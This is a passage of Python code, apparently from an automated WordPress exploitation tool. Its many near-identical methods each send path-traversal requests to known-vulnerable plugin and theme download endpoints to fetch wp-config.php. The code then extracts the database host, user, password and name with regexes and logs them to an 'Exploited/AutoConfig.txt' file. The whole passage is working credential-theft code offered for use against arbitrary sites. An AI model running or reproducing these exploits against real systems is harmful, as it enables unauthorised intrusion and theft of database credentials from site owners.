                                     0] + '\n---------------------\n')
                except:
                    self.Print_NotVuln('wp-support-plus-responsive-ticket-system', site)
            else:
                self.Print_NotVuln('wp-support-plus-responsive-ticket-system', site)
        except:
            self.Print_NotVuln('wp-support-plus-responsive-ticket-system', site)

    def eshop_magic(self, site):
        try:
            Exp = 'http://' + site + \
                  'wp-content/plugins/eshop-magic/download.php?file=../../../../wp-config.php'
            GetConfig = requests.get(Exp, timeout=5, headers=self.Headers)
            if 'DB_PASSWORD' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('Exploited/AutoConfig.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text)
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text)
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text)
                    with open('Exploited/AutoConfig.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                except:
                    self.Print_NotVuln('eshop-magic', site)
            else:
                self.Print_NotVuln('eshop-magic', site)
        except:
            self.Print_NotVuln('eshop-magic', site)

    def ungallery(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-content/plugins/ungallery/source_vuln.php?pic=../../../../../wp-config.php'
            GetConfig = requests.get(Exp, timeout=5, headers=self.Headers)
            if 'DB_PASSWORD' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('Exploited/AutoConfig.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text)
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text)
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text)
                    with open('Exploited/AutoConfig.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                except:
                    self.Print_NotVuln('ungallery', site)
            else:
                self.Print_NotVuln('ungallery', site)
        except:
            self.Print_NotVuln('ungallery', site)
			
    def membershipsimplified(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-content/plugins/membership-simplified-for-oap-members-only/download.php?download_file=/wp-config.php'
            GetConfig = requests.get(Exp, timeout=5, headers=self.Headers)
            if 'DB_PASSWORD' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('Exploited/AutoConfig.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text)
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text)
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text)
                    with open('Exploited/AutoConfig.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                except:
                    self.Print_NotVuln('membershipsimplified', site)
            else:
                self.Print_NotVuln('membershipsimplified', site)
        except:
            self.Print_NotVuln('membershipsimplified', site)

    def MacPhotoGallery(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-content/plugins/mac-photo-gallery/macdownload.php?albid=/wp-config.php'
            GetConfig = requests.get(Exp, timeout=5, headers=self.Headers)
            if 'DB_PASSWORD' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('Exploited/AutoConfig.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text)
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text)
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text)
                    with open('Exploited/AutoConfig.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                except:
                    self.Print_NotVuln('MacPhotoGallery', site)
            else:
                self.Print_NotVuln('MacPhotoGallery', site)
        except:
            self.Print_NotVuln('MacPhotoGallery', site)

    def jtrtresponsivetables(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-admin/admin-ajax.php?action=get_old_table'
            GetConfig = requests.get(Exp, timeout=5, headers=self.Headers)
            if 'DB_PASSWORD' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('Exploited/AutoConfig.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text)
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text)
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text)
                    with open('Exploited/AutoConfig.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                except:
                    self.Print_NotVuln('jtrtresponsivetables', site)
            else:
                self.Print_NotVuln('jtrtresponsivetables', site)
        except:
            self.Print_NotVuln('jtrtresponsivetables', site)

    def acento(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-content/themes/acento/includes/view-pdf.php?download=1&file=/path/wp-config.php'
            GetConfig = requests.get(Exp, timeout=5, headers=self.Headers)
            if 'DB_PASSWORD' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('Exploited/AutoConfig.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text)
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text)
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text)
                    with open('Exploited/AutoConfig.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                except:
                    self.Print_NotVuln('acento', site)
            else:
                self.Print_NotVuln('acento', site)
        except:
            self.Print_NotVuln('acento', site)

    def ajaxstore(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-content/plugins/ajax-store-locator-wordpress_0/sl_file_download.php?download_file=../../../wp-config.php'
            GetConfig = requests.get(Exp, timeout=5, headers=self.Headers)
            if 'DB_PASSWORD' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('Exploited/AutoConfig.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text)
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text)
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text)
                    with open('Exploited/AutoConfig.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                except:
                    self.Print_NotVuln('ajaxstore', site)
            else:
                self.Print_NotVuln('ajaxstore', site)
        except:
            self.Print_NotVuln('ajaxstore', site)

    def Antioch(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-content/themes/antioch/lib/scripts/download.php?file=../../../../../wp-config.php'
            GetConfig = requests.get(Exp, timeout=5, headers=self.Headers)
            if 'DB_PASSWORD' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('Exploited/AutoConfig.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text)
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text)
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text)
                    with open('Exploited/AutoConfig.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                except:
                    self.Print_NotVuln('Antioch', site)
            else:
                self.Print_NotVuln('Antioch', site)
        except:
            self.Print_NotVuln('Antioch', site)
			
    def Authentic(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-content/themes/authentic/includes/download.php?file=../../../../wp-config.php'
            GetConfig = requests.get(Exp, timeout=5, headers=self.Headers)
            if 'DB_PASSWORD' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('Exploited/AutoConfig.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text)
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text)
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text)
                    with open('Exploited/AutoConfig.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                except:
                    self.Print_NotVuln('Authentic', site)
            else:
                self.Print_NotVuln('Authentic', site)
        except:
            self.Print_NotVuln('Authentic', site)			

    def Churchope(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php'
            GetConfig = requests.get(Exp, timeout=5, headers=self.Headers)
            if 'DB_PASSWORD' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('Exploited/AutoConfig.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text)
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text)
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text)
                    with open('Exploited/AutoConfig.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                except:
                    self.Print_NotVuln('Churchope', site)
            else:
                self.Print_NotVuln('Churchope', site)
        except:
            self.Print_NotVuln('Churchope', site)		

    def Epic(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-content/themes/epic/includes/download.php?file=wp-config.php'
            GetConfig = requests.get(Exp, timeout=5, headers=self.Headers)
            if 'DB_PASSWORD' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('Exploited/AutoConfig.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text)
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text)
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text)
                    with open('Exploited/AutoConfig.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                except:
                    self.Print_NotVuln('Epic', site)
            else:
                self.Print_NotVuln('Epic', site)
        except:
            self.Print_NotVuln('Epic', site)	

    def Felis(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-content/themes/felis/download.php?file=../wp-config.php'
            GetConfig = requests.get(Exp, timeout=5, headers=self.Headers)
            if 'DB_PASSWORD' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('Exploited/AutoConfig.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text)
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text)
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text)
                    with open('Exploited/AutoConfig.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                except:
                    self.Print_NotVuln('Felis', site)
            else:
                self.Print_NotVuln('Felis', site)
        except:
            self.Print_NotVuln('Felis', site)

    def Force(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-content/force-download.php?file=../wp-config.php'
            GetConfig = requests.get(Exp, timeout=5, headers=self.Headers)
            if 'DB_PASSWORD' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('Exploited/AutoConfig.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text)
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text)
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text)
                    with open('Exploited/AutoConfig.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                except:
                    self.Print_NotVuln('Force', site)
            else:
                self.Print_NotVuln('Force', site)
        except:
            self.Print_NotVuln('Force', site)
			
			
    def hbaudio(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10'
            GetConfig = requests.get(Exp, timeout=5, headers=self.Headers)
            if 'DB_PASSWORD' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('Exploited/AutoConfig.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text)
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text)
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text)
                    with open('Exploited/AutoConfig.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                except:
                    self.Print_NotVuln('hbaudio', site)
            else:
                self.Print_NotVuln('hbaudio', site)
        except:
            self.Print_NotVuln('hbaudio', site)			

    def History(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-content/plugins/history-collection/download.php?var=../../../wp-config.php'
            GetConfig = requests.get(Exp, timeout=5, headers=self.Headers)
            if 'DB_PASSWORD' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('Exploited/AutoConfig.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text)
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text)
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text)
                    with open('Exploited/AutoConfig.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                except:
                    self.Print_NotVuln('History', site)
            else:
                self.Print_NotVuln('History', site)
        except:
            self.Print_NotVuln('History', site)	

    def Imageex(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-content/plugins/image-export/download.php?file=../../../wp-config.php'
            GetConfig = requests.get(Exp, timeout=5, headers=self.Headers)
            if 'DB_PASSWORD' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('Exploited/AutoConfig.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text)
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text)
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text)
                    with open('Exploited/AutoConfig.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                except:
                    self.Print_NotVuln('Imageex', site)
            else:
                self.Print_NotVuln('Imageex', site)
        except:
            self.Print_NotVuln('Imageex', site)	

    def kbslider(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-admin/admin-ajax.php?action=kbslider_show_image&img=../wp-config.php'
            GetConfig = requests.get(Exp, timeout=5, headers=self.Headers)
            if 'DB_PASSWORD' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('Exploited/AutoConfig.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text)
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text)
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text)
                    with open('Exploited/AutoConfig.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                except:
                    self.Print_NotVuln('kbslider', site)
            else:
                self.Print_NotVuln('kbslider', site)
        except:
            self.Print_NotVuln('kbslider', site)	

    def Linenity(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-content/themes/linenity/functions/download.php?imgurl=../../../../wp-config.php'
            GetConfig = requests.get(Exp, timeout=5, headers=self.Headers)
            if 'DB_PASSWORD' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('Exploited/AutoConfig.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text)
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text)
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text)
                    with open('Exploited/AutoConfig.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                except:
                    self.Print_NotVuln('Linenity', site)
            else:
                self.Print_NotVuln('Linenity', site)
        except:
            self.Print_NotVuln('Linenity', site)	

    def Lote27(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-content/themes/lote27/download.php?download=../../../wp-config.php'
            GetConfig = requests.get(Exp, timeout=5, headers=self.Headers)
            if 'DB_PASSWORD' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('Exploited/AutoConfig.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text)
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text)
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text)
                    with open('Exploited/AutoConfig.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                except:
                    self.Print_NotVuln('Lote27', site)
            else:
                self.Print_NotVuln('Lote27', site)
        except:
            self.Print_NotVuln('Lote27', site)

    def Markant(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-content/themes/markant/download.php?file=../../wp-config.php'
            GetConfig = requests.get(Exp, timeout=5, headers=self.Headers)
            if 'DB_PASSWORD' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('Exploited/AutoConfig.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text)
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text)
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text)
                    with open('Exploited/AutoConfig.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                except:
                    self.Print_NotVuln('Markant', site)
            else:
                self.Print_NotVuln('Markant', site)
        except:
            self.Print_NotVuln('Markant', site)

    def MichaelCanthony(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-content/themes/MichaelCanthony/download.php?file=../../../wp-config.php'
            GetConfig = requests.get(Exp, timeout=5, headers=self.Headers)
            if 'DB_PASSWORD' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('Exploited/AutoConfig.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text)
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text)
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text)
                    with open('Exploited/AutoConfig.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                except:
                    self.Print_NotVuln('MichaelCanthony', site)
            else:
                self.Print_NotVuln('MichaelCanthony', site)
        except:
            self.Print_NotVuln('MichaelCanthony', site)


    def NativeChurch(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-content/themes/NativeChurch/download/download.php?file=../../../../wp-config.php'
            GetConfig = requests.get(Exp, timeout=5, headers=self.Headers)
            if 'DB_PASSWORD' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('Exploited/AutoConfig.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text)
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text)
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text)
                    with open('Exploited/AutoConfig.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                except:
                    self.Print_NotVuln('NativeChurch', site)
            else:
                self.Print_NotVuln('NativeChurch', site)
        except:
            self.Print_NotVuln('NativeChurch', site)

    def Parallelus(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-content/themes/parallelus-salutation/framework/utilities/download/getfile.php?file=..%2F..%2F..%2F..%2F..%2F..%2Fwp-config.php'
            GetConfig = requests.get(Exp, timeout=5, headers=self.Headers)
            if 'DB_PASSWORD' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('Exploited/AutoConfig.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text)
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text)
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text)
                    with open('Exploited/AutoConfig.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                except:
                    self.Print_NotVuln('Parallelus', site)
            else:
                self.Print_NotVuln('Parallelus', site)
        except:
            self.Print_NotVuln('Parallelus', site)

    def RedSteel(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-content/themes/RedSteel/download.php?file=../../../wp-config.php'
            GetConfig = requests.get(Exp, timeout=5, headers=self.Headers)
            if 'DB_PASSWORD' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('Exploited/AutoConfig.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text)
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text)
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text)
                    with open('Exploited/AutoConfig.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                except:
                    self.Print_NotVuln('RedSteel', site)
            else:
                self.Print_NotVuln('RedSteel', site)
        except:
            self.Print_NotVuln('RedSteel', site)

    def S3bubble(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-content/plugins/s3bubble-amazon-s3-html-5-video-with-adverts/assets/plugins/ultimate/content/downloader.php?name=wp-config.php&path=../../../../../../../wp-config.php'
            GetConfig = requests.get(Exp, timeout=5, headers=self.Headers)
            if 'DB_PASSWORD' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('Exploited/AutoConfig.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text)
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text)
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text)
                    with open('Exploited/AutoConfig.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                except:
                    self.Print_NotVuln('S3bubble', site)
            else:
                self.Print_NotVuln('S3bubble', site)
        except:
            self.Print_NotVuln('S3bubble', site)

    def SMWF(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-content/themes/SMWF/inc/download.php?file=../wp-config.php'
            GetConfig = requests.get(Exp, timeout=5, headers=self.Headers)
            if 'DB_PASSWORD' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('Exploited/AutoConfig.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text)
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text)
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text)
                    with open('Exploited/AutoConfig.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                except:
                    self.Print_NotVuln('SMWF', site)
            else:
                self.Print_NotVuln('SMWF', site)
        except:
            self.Print_NotVuln('SMWF', site)

    def TheLoft(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-content/themes/TheLoft/download.php?file=../../../wp-config.php'
            GetConfig = requests.get(Exp, timeout=5, headers=self.Headers)
            if 'DB_PASSWORD' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('Exploited/AutoConfig.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text)
